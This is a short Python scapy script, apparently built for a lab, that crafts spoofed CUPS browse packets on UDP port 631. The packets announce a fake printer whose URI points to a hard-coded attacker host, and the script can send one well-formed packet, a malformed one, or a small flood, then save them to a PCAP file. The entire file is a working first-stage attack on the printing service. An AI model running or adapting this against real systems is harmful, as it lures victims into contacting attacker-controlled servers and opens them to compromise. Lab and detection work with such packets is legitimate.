import argparse
import os
from scapy.all import IP, UDP, Raw, send, wrpcap

output_dir = "pcap_files"
TARGER_IP = "172.18.0.2"
ATTACKER_IP = "172.17.0.1"
PORT = 631

def main():
    parser = argparse.ArgumentParser(description="tool for testing udp packets sending")
    #parser.add_argument("-t", "--target", required=True, help="victim ip address")
    #parser.add_argument("-p", "--port", type=int, default=631, help="destination port (e.g., 631)")
    parser.add_argument("-o", "--output", help="path to save the PCAP file")
    #parser.add_argument("-a", "--attacker", help="attacker IP address for the URI")
    parser.add_argument("-m", "--mode", help="choose mode: 'correct', 'malformed', 'flood'")
    
    args = parser.parse_args()

    # variables
    #target_ip = args.target
    #target_port = args.port
    #attacker_ip = args.attacker
    
    target_ip = TARGER_IP
    target_port = PORT
    pcap_file = args.output
    attacker_ip = ATTACKER_IP

    print(f"[*] Preparing attack towards {target_ip} on UDP port {target_port}...")

    # Payload definition
    # here i will put the legacy text string that he expects, like:
    # ipp://<indirizzo-ip>:<porta>/printers/<nome-stampante>
    # http://<attacker_ip>:8631/printers/LabPrinter
    # test: TEST_SCAPY_1
    # complete: http://172.17.0.1:8631/printers/LabPrinter
    #payload_malevolo = b"http://{attacker_ip}:8{target_port}/printers/LabPrinter"

    # Stacking
    #packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=payload_malevolo)


    #field definitions
    printer_type = "0" # default type
    printer_state = "3" # idle state
    printer_uri = f"http://{attacker_ip}:8{target_port}/printers/LabPrinter"
    printer_location = "Office HQ" # needed human readable location
    printer_info = "Fake-Printer" # needed human readable info

    correct_payload = bytes(f'{printer_type} {printer_state} {printer_uri} "{printer_location}" "{printer_info}"', 'UTF-8')
    malformed_payload = bytes(f'{printer_type} {printer_state} " " {printer_uri} "{printer_location}" "{printer_info}"', 'UTF-8')

    if args.mode == "malformed":
        payload = malformed_payload
    else:
        payload = correct_payload

    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=payload)

    if args.mode == "flood":
        print("[*] Sending a flood of packets...")
        for _ in range(10):
            send(packet, verbose=False)
    else:
        print("[*] Sending a single packet...")
        send(packet, verbose=False)

    # saving in PCAP
    if pcap_file:
        print(f"[*] Saving to {pcap_file}...")
        if not os.path.isdir(output_dir):
            print(f"[-] !!! Error: directory '{output_dir}/' not found.")
        else:
            filename = os.path.basename(args.output)
            final_path = os.path.join(output_dir, filename)
            wrpcap(final_path, packet)
    else:
        print("[-] No output file specified. Not saving PCAP.")
    
    print("[+] Operation completed. Check the logs or tcpdump to verify the victim's reaction.")

main()
